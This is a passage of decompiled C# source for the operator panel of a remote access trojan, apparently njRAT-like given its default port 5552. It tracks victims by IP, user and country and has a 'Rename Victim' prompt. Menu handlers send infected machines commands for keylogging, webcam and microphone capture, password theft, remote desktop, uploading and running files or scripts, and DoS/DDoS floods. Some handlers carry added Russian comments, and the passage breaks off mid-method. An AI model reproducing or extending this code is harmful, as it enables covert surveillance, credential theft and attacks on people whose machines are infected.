		// (set) Token: 0x060001B7 RID: 439 RVA: 0x001570A0 File Offset: 0x001554A0
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= eventHandler;
				}
				this._ToolStripMenuItem1 = value;
				flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000A9 RID: 169
		// (get) Token: 0x060001B8 RID: 440 RVA: 0x00157100 File Offset: 0x00155500
		// (set) Token: 0x060001B9 RID: 441 RVA: 0x00157118 File Offset: 0x00155518
		internal virtual ToolStripMenuItem Plugin1ToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Plugin1ToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Plugin1ToolStripMenuItem_Click);
				bool flag = this._Plugin1ToolStripMenuItem != null;
				if (flag)
				{
					this._Plugin1ToolStripMenuItem.Click -= eventHandler;
				}
				this._Plugin1ToolStripMenuItem = value;
				flag = this._Plugin1ToolStripMenuItem != null;
				if (flag)
				{
					this._Plugin1ToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000AA RID: 170
		// (get) Token: 0x060001BA RID: 442 RVA: 0x00157178 File Offset: 0x00155578
		// (set) Token: 0x060001BB RID: 443 RVA: 0x00157190 File Offset: 0x00155590
		internal virtual ToolStripMenuItem Plugin2ToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Plugin2ToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Plugin2ToolStripMenuItem_Click);
				bool flag = this._Plugin2ToolStripMenuItem != null;
				if (flag)
				{
					this._Plugin2ToolStripMenuItem.Click -= eventHandler;
				}
				this._Plugin2ToolStripMenuItem = value;
				flag = this._Plugin2ToolStripMenuItem != null;
				if (flag)
				{
					this._Plugin2ToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000AB RID: 171
		// (get) Token: 0x060001BC RID: 444 RVA: 0x001571F0 File Offset: 0x001555F0
		// (set) Token: 0x060001BD RID: 445 RVA: 0x00157208 File Offset: 0x00155608
		internal virtual ContextMenuStrip ContextMenuStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip2 = value;
			}
		}

		// Token: 0x170000AC RID: 172
		// (get) Token: 0x060001BE RID: 446 RVA: 0x00157214 File Offset: 0x00155614
		// (set) Token: 0x060001BF RID: 447 RVA: 0x0015722C File Offset: 0x0015562C
		internal virtual ToolStripMenuItem SdfghToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SdfghToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.SdfghToolStripMenuItem_Click);
				bool flag = this._SdfghToolStripMenuItem != null;
				if (flag)
				{
					this._SdfghToolStripMenuItem.Click -= eventHandler;
				}
				this._SdfghToolStripMenuItem = value;
				flag = this._SdfghToolStripMenuItem != null;
				if (flag)
				{
					this._SdfghToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000AD RID: 173
		// (get) Token: 0x060001C0 RID: 448 RVA: 0x0015728C File Offset: 0x0015568C
		// (set) Token: 0x060001C1 RID: 449 RVA: 0x001572A4 File Offset: 0x001556A4
		internal virtual ToolStripSeparator ToolStripSeparator1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator1 = value;
			}
		}

		// Token: 0x170000AE RID: 174
		// (get) Token: 0x060001C2 RID: 450 RVA: 0x001572B0 File Offset: 0x001556B0
		// (set) Token: 0x060001C3 RID: 451 RVA: 0x001572C8 File Offset: 0x001556C8
		internal virtual ToolStripMenuItem ExitToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ExitToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ExitToolStripMenuItem_Click_1);
				bool flag = this._ExitToolStripMenuItem != null;
				if (flag)
				{
					this._ExitToolStripMenuItem.Click -= eventHandler;
				}
				this._ExitToolStripMenuItem = value;
				flag = this._ExitToolStripMenuItem != null;
				if (flag)
				{
					this._ExitToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x060001C4 RID: 452 RVA: 0x00157328 File Offset: 0x00155728
		public Form1()
		{
			base.Activated += this.Form1_Activated;
			base.Deactivate += this.Form1_Deactivate;
			base.FormClosing += this.Form1_FormClosing;
			base.Load += this.Form1_Load;
			Form1.__ENCAddToList(this);
			this.Yy = Class7.string_1;
			this.isActive = false;
			this.int_0 = 0;
			this.InitializeComponent();
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x001573B8 File Offset: 0x001557B8
		public void dsk()
		{
			for (;;)
			{
				int num = 0;
				switch (Class7.class8_0.int_2)
				{
				case 0:
					num = 10;
					break;
				case 1:
					num = 2000;
					break;
				case 2:
					num = 5000;
					break;
				case 3:
					num = 7500;
					break;
				default:
					num = 10000;
					break;
				}
				bool flag = this.isActive & ((ulong)GClass7.smethod_0() < 12000UL) & (this.L1.Columns[0].Width != 0);
				if (flag)
				{
					foreach (DataGridViewRow dataGridViewRow in this.L1.method_3())
					{
						bool flag2 = dataGridViewRow != null;
						if (flag2)
						{
							Client client = (Client)dataGridViewRow.Tag;
							flag2 = client != null;
							if (flag2)
							{
								bool flag3 = false;
								flag2 = DateTime.Compare(client.lastPC, DateTime.MinValue) == 0;
								if (flag2)
								{
									flag3 = true;
								}
								else
								{
									flag2 = DateAndTime.Now.Subtract(client.lastPC).TotalMilliseconds >= (double)num;
									if (flag2)
									{
										flag3 = true;
									}
								}
								flag2 = !client.Isend && flag3;
								if (flag2)
								{
									client.Isend = true;
									client.lastPC = DateAndTime.Now;
									client.Send(string.Concat(new string[]
									{
										"CAP",
										Class7.string_1,
										Conversions.ToString(this.L1.Columns[0].Width),
										Class7.string_1,
										Conversions.ToString(this.L1.method_6())
									}));
								}
							}
						}
					}
				}
				Thread.Sleep((int)Math.Round(Math.Round((double)num / 2.0)));
			}
		}

		// Token: 0x060001C6 RID: 454 RVA: 0x001575CC File Offset: 0x001559CC
		private void Form1_Activated(object sender, EventArgs e)
		{
			this.isActive = true;
			this.Opacity = 1.0;
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x001575E8 File Offset: 0x001559E8
		private void Form1_Deactivate(object sender, EventArgs e)
		{
			this.isActive = false;
			this.Opacity = 0.95;
		}

		// Token: 0x060001C8 RID: 456 RVA: 0x00157604 File Offset: 0x00155A04
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.NotifyIcon1.Visible = false;
			try
			{
				Class7.waveOut_0.Dispose();
			}
			catch (Exception ex)
			{
			}
			Class7.class8_0.method_1();
			ProjectData.EndApp();
		}

		// Token: 0x060001C9 RID: 457 RVA: 0x00157660 File Offset: 0x00155A60
		private void Form1_Load(object sender, EventArgs e)
		{
			try
			{
				this.Left = 0 - this.Width + Screen.PrimaryScreen.WorkingArea.Width;
				this.Top = 0 - this.Height + Screen.PrimaryScreen.WorkingArea.Height;
				this.L1.method_11("Screen", L1.GEnum0.StretchImage, DataGridViewAutoSizeColumnMode.None);
				this.L1.method_11("Name", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("IP", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("PC", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("User", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Install Date", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Flag", L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Country", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Operating System", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Cam", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Ver", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Ping", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Active Window", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.Columns[0].Width = 35;
				this.Show();
				Class7.notf_0.Show();
				Control.CheckForIllegalCrossThreadCalls = false;
				Class7.form1_0 = this;
				this.Text = Class7.string_0;
				this.NotifyIcon1.Text = Class7.string_0;
				this.NotifyIcon1.Icon = this.Icon;
				this.ShowInTaskbar = true;
				this.Pp1.T.Enabled = true;
				foreach (string text in Directory.GetFiles(Application.StartupPath + "\\plugin\\", "*.dll"))
				{
					Class7.Class9 @class = new Class7.Class9(new FileInfo(text).Name.ToLower());
					Class7.list_1.Add(@class);
				}
				foreach (string text2 in Strings.Split("cam.dll,ch.dll,pw.dll,sc2.dll,mic.dll,plg.dll", ",", -1, CompareMethod.Binary))
				{
					bool flag = Class7.smethod_0(text2, null) == null;
					if (flag)
					{
						Interaction.MsgBox("Missing dll >> " + text2, MsgBoxStyle.OkOnly, null);
						string text3 = Strings.Split(text2, ".", -1, CompareMethod.Binary)[0];
						flag = Operators.CompareString(text3, "cam", false) == 0;
						if (flag)
						{
							this.RemoteCamToolStripMenuItem.Enabled = false;
						}
						else
						{
							flag = Operators.CompareString(text3, "ch", false) == 0;
							if (flag)
							{
								this.OpenChatToolStripMenuItem.Enabled = false;
							}
							else
							{
								flag = Operators.CompareString(text3, "plg", false) == 0;
								if (flag)
								{
									this.ManagerToolStripMenuItem.Enabled = false;
								}
								else
								{
									flag = Operators.CompareString(text3, "pw", false) == 0;
									if (flag)
									{
										this.GetPasswordsToolStripMenuItem.Enabled = false;
									}
									else
									{
										flag = Operators.CompareString(text3, "sc2", false) == 0;
										if (flag)
										{
											this.RemoteDesktopToolStripMenuItem.Enabled = false;
										}
										else
										{
											flag = Operators.CompareString(text3, "mic", false) == 0;
											if (flag)
											{
												this.MicrophoneToolStripMenuItem.Enabled = false;
											}
										}
									}
								}
							}
						}
					}
				}
				try
				{
					Class7.waveOut_0 = new WaveOut(0);
					Class7.waveOut_0.Open(WaveFormat.Pcm8Khz8BitMono);
					Class7.waveOut_1 = new WaveOut(0);
					Class7.waveOut_1.Open(WaveFormat.Pcm44Khz16BitMono);
				}
				catch (Exception ex)
				{
					this.MicrophoneToolStripMenuItem.Enabled = false;
				}
				Class7.class8_0.method_0();
				for (;;)
				{
					try
					{
						port port = new port();
						port.TextBox1.Text = Class6.smethod_2("port", "5552");
						port.ShowDialog(this);
						bool flag = port.portVal < 1;
						if (flag)
						{
							this.Close();
							return;
						}
						this.port = port.portVal;
						this.S = new SK(this.port);
						Class6.smethod_3("port", Conversions.ToString(this.port));
					}
					catch (Exception ex2)
					{
						Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, null);
						continue;
					}
					break;
				}
				Class7.sk_0 = this.S;
				Thread thread = new Thread(new ThreadStart(this.dsk), 1);
				thread.Start();
				this.Timer1.Enabled = true;
			}
			catch (Exception ex3)
			{
			}
		}

		// Token: 0x060001CA RID: 458 RVA: 0x00157BA8 File Offset: 0x00155FA8
		private void ToolStripStatusLabel1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(this.ToolStripStatusLabel1.Tag), "2", false);
			if (flag)
			{
				this.ToolStripStatusLabel1.Text = "[ Logs ]";
				this.ToolStripStatusLabel1.Tag = "1";
				this.L1.BringToFront();
			}
			else
			{
				this.ToolStripStatusLabel1.Text = "[ Users ]";
				this.ToolStripStatusLabel1.Tag = "2";
				this.Pp1.BringToFront();
			}
		}

		// Token: 0x060001CB RID: 459 RVA: 0x00157C38 File Offset: 0x00156038
		private void DisconnectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "CN", new object[] { false }, null, null, false, true);
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060001CC RID: 460 RVA: 0x00157D10 File Offset: 0x00156110
		private void RemoteCamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 @class = Class7.smethod_0("cam.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, @class, false);
					}
				}
				finally
				{
					
				}
			}
		}

		// Token: 0x060001CD RID: 461 RVA: 0x00157DB4 File Offset: 0x001561B4
		private void KeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[] { "kl" }, null, null, null, true);
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060001CE RID: 462 RVA: 0x00157E4C File Offset: 0x0015624C
		private void ToolStripStatusLabel4_Click(object sender, EventArgs e)
		{
			MyProject.Forms.About.ShowDialog();
		}

		// Token: 0x060001CF RID: 463 RVA: 0x00157E60 File Offset: 0x00156260
		private void OpenChatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 @class = Class7.smethod_0("ch.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, @class, false);
					}
				}
				finally
				{
					
				}
			}
		}

		// Token: 0x060001D0 RID: 464 RVA: 0x00157F04 File Offset: 0x00156304
		private void OpenFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = !Directory.Exists(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(this.L1.SelectedRows[0].Tag), null, "folder", new object[0], null, null, null))));
				if (flag)
				{
					Directory.CreateDirectory(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(this.L1.SelectedRows[0].Tag), null, "folder", new object[0], null, null, null))));
				}
				object[] array = new object[1];
				object objectValue = RuntimeHelpers.GetObjectValue(this.L1.SelectedRows[0].Tag);
				array[0] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[0], null, null, null))));
				object[] array2 = array;
				bool[] array3 = new bool[] { true };
				NewLateBinding.LateCall(null, typeof(Process), "Start", array2, null, null, array3, true);
				flag = array3[0];
				if (flag)
				{
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2[0]))) }, null, null, true, true);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060001D1 RID: 465 RVA: 0x00158088 File Offset: 0x00156488
		private void FromLINKToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog
				{
					FileName = string.Empty
				};
				flag = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					bool flag2 = true;
					byte[] array = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), ref flag2);
					MemoryStream memoryStream = new MemoryStream();
					string text = "rn" + Class7.string_1 + new FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1;
					memoryStream.Write(Class6.smethod_11(ref text), 0, text.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						memoryStream.ToArray(),
						this.L1.DefaultCellStyle.ForeColor
					});
				}
			}
		}

		// Token: 0x060001D2 RID: 466 RVA: 0x00158198 File Offset: 0x00156598
		private void FromDISKToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog
				{
					Filter = "EXE|*.exe",
					FileName = string.Empty
				};
				flag = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					bool flag2 = true;
					byte[] array = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), ref flag2);
					MemoryStream memoryStream = new MemoryStream();
					string text = "up" + Class7.string_1;
					memoryStream.Write(Class6.smethod_11(ref text), 0, text.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						memoryStream.ToArray(),
						this.L1.DefaultCellStyle.ForeColor
					});
				}
			}
		}

		// Token: 0x060001D3 RID: 467 RVA: 0x0015829C File Offset: 0x0015669C
		private void ScriptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				script script = new script();
				script.ShowDialog(this);
				flag = script.Code.Length > 0;
				if (flag)
				{
					bool flag2 = true;
					byte[] array = Class6.smethod_8(Class6.smethod_11(ref script.Code), ref flag2);
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = memoryStream;
					string text = "rn" + Class7.string_1 + script.RunAs + Class7.string_1;
					byte[] array2 = Class6.smethod_11(ref text);
					int num = 0;
					string text2 = "rn" + Class7.string_1 + script.RunAs + Class7.string_1;
					memoryStream2.Write(array2, num, Class6.smethod_11(ref text2).Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						memoryStream.ToArray(),
						this.L1.DefaultCellStyle.ForeColor
					});
				}
			}
		}

		// Token: 0x060001D4 RID: 468 RVA: 0x001583B8 File Offset: 0x001567B8
		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
			Thread thread2 = thread;
			object[] array = new object[2];
			object[] array2 = array;
			int num = 0;
			string text = "un" + Class7.string_1 + "~";
			array2[num] = Class6.smethod_11(ref text);
			array[1] = this.L1.DefaultCellStyle.ForeColor;
			thread2.Start(array);
		}

		// Token: 0x060001D5 RID: 469 RVA: 0x00158424 File Offset: 0x00156824
		private void MicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 @class = Class7.smethod_0("mic.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, @class, false);
					}
				}
				finally
				{
					
				}
			}
		}

		// Token: 0x060001D6 RID: 470 RVA: 0x001584C8 File Offset: 0x001568C8
		private void ToolStripStatusLabel5_Click(object sender, EventArgs e)
		{
			STNG stng = new STNG
			{
				StartPosition = FormStartPosition.CenterScreen
			};
			stng.ShowDialog();
		}

		// Token: 0x060001D7 RID: 471 RVA: 0x001584F0 File Offset: 0x001568F0
		private void ManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					Client client = (Client)dataGridViewRow.Tag;
					bool flag = client != null;
					if (flag)
					{
						Manager manager = (Manager)Class7.smethod_3("m" + client.ip());
						flag = manager == null;
						if (flag)
						{
							manager = new Manager
							{
								sk = client,
								Name = "m" + client.ip()
							};
							manager.Show();
						}
						else
						{
							manager.WindowState = FormWindowState.Minimized;
							manager.WindowState = FormWindowState.Normal;
						}
					}
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060001D8 RID: 472 RVA: 0x001585E8 File Offset: 0x001569E8
		private void L1_ColumnWidthChanged(object sender, DataGridViewColumnEventArgs e)
		{
			bool flag = e.Column.Index == 0;
			if (flag)
			{
				bool flag2 = e.Column.Width > 250;
				if (flag2)
				{
					e.Column.Width = 250;
				}
				flag2 = e.Column.Width < 35;
				if (flag2)
				{
					e.Column.Width = 35;
				}
				this.L1.method_7((int)Math.Round(Math.Round((double)e.Column.Width * 0.67)));
			}
		}

		// Token: 0x060001D9 RID: 473 RVA: 0x00158684 File Offset: 0x00156A84
		private void NotifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			try
			{
				Interaction.AppActivate(this.Text);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060001DA RID: 474 RVA: 0x001586C4 File Offset: 0x00156AC4
		private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
			Thread thread2 = thread;
			object[] array = new object[2];
			object[] array2 = array;
			int num = 0;
			string text = "un" + Class7.string_1 + "@";
			array2[num] = Class6.smethod_11(ref text);
			array[1] = this.L1.DefaultCellStyle.ForeColor;
			thread2.Start(array);
		}

		// Token: 0x060001DB RID: 475 RVA: 0x00158730 File Offset: 0x00156B30
		private void CloseToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
			Thread thread2 = thread;
			object[] array = new object[2];
			object[] array2 = array;
			int num = 0;
			string text = "un" + Class7.string_1 + "!";
			array2[num] = Class6.smethod_11(ref text);
			array[1] = this.L1.DefaultCellStyle.ForeColor;
			thread2.Start(array);
		}

		// Token: 0x060001DC RID: 476 RVA: 0x0015879C File Offset: 0x00156B9C
		private void FromDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog
				{
					FileName = string.Empty
				};
				flag = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					bool flag2 = true;
					byte[] array = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), ref flag2);
					MemoryStream memoryStream = new MemoryStream();
					string text = "rn" + Class7.string_1 + new FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1;
					memoryStream.Write(Class6.smethod_11(ref text), 0, text.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						memoryStream.ToArray(),
						this.L1.DefaultCellStyle.ForeColor
					});
				}
			}
		}

		// Token: 0x060001DD RID: 477 RVA: 0x001588AC File Offset: 0x00156CAC
		private void FromLinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				FURL furl = new FURL();
				furl.ShowDialog(this);
				flag = furl.IsOK;
				if (flag)
				{
					string text = string.Concat(new string[]
					{
						"rn",
						Class7.string_1,
						furl.TextBox2.Text,
						Class7.string_1,
						furl.TextBox1.Text
					});
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						Class6.smethod_11(ref text),
						Color.Green
					});
				}
			}
		}

		// Token: 0x060001DE RID: 478 RVA: 0x00158980 File Offset: 0x00156D80
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Enter New Name", "Rename Victim", string.Empty, -1, -1);
			bool flag = text.Length > 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						try
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[] { string.Concat(new string[]
							{
								"prof",
								Class7.string_1,
								"~",
								Class7.string_1,
								"vn",
								Class7.string_1,
								Class6.smethod_14(ref text)
							}) }, null, null, null, true);
							dataGridViewRow.Cells[Class7.int_0].Value = text + "_" + Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells[Class7.int_0].Value)), "_", -1, CompareMethod.Binary)[Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells[Class7.int_0].Value)), "_", -1, CompareMethod.Binary).Length - 1];
						}
						catch (Exception ex)
						{
						}
					}
				}
				finally
				{
					
				}
			}
		}

		// Token: 0x060001DF RID: 479 RVA: 0x00158B70 File Offset: 0x00156F70
		private void ToolStripStatusLabel3_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Builder.ShowDialog();
		}

		// Token: 0x060001E0 RID: 480 RVA: 0x00158B84 File Offset: 0x00156F84
		private void RemoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 @class = Class7.smethod_0("sc2.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, @class, false);
					}
				}
				finally
				{
					
				}
			}
		}

		// Token: 0x060001E1 RID: 481 RVA: 0x00158C28 File Offset: 0x00157028
		private void Timer1_Tick(object sender, EventArgs e)
		{
            try
            {
                this.int_0++;
                bool flag = this.int_0 == 10;
                if (flag)
                {
                    this.int_0 = 0;
                    if (this.upl != null && this.dwn != null) // Добавленная проверка на null
                    {
                        this.upl.Text = "Upload [" + Class6.smethod_17(Class7.long_0) + "]";
                        this.dwn.Text = "Download [" + Class6.smethod_17(Class7.long_1) + "]";
                    }
                    Class7.long_0 = 0L;
                    Class7.long_1 = 0L;
                }
                if (this.Text != null && this.port != null && this.L1 != null && this.S != null) // Добавленная проверка на null
                {
                    this.Text = string.Concat(new string[]
                    {
            Class7.string_0,
            "    Port[ ",
            Conversions.ToString(this.port),
            " ]    Online[ ",
            Conversions.ToString(this.L1.RowCount),
            " ]    Selected[",
            Conversions.ToString(this.L1.SelectedRows.Count),
            "] REQ[",
            Conversions.ToString(this.S.REQ.Count),
            "]"
                    });
                }
                if (this.conz != null && this.S != null) // Добавленная проверка на null
                {
                    this.conz.Text = "Connections[" + Conversions.ToString(this.S.Online.Count) + "]";
                }
            }
            catch (Exception ex)
			{
			}
		}

		// Token: 0x060001E2 RID: 482 RVA: 0x00158DB4 File Offset: 0x001571B4
		private void Button1_Click(object sender, EventArgs e)
		{
			this.Hide();
		}

		// Token: 0x060001E3 RID: 483 RVA: 0x00158DC0 File Offset: 0x001571C0
		private void DDoSToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[] { "dos" }, null, null, null, true);
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060001E4 RID: 484 RVA: 0x00158E58 File Offset: 0x00157258
		private void OpenSitesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[] { "site" }, null, null, null, true);
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060001E5 RID: 485 RVA: 0x00158EF0 File Offset: 0x001572F0
		private void DDoSToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[] { "ddos" }, null, null, null, true);
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060001E6 RID: 486 RVA: 0x00158F88 File Offset: 0x00157388
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
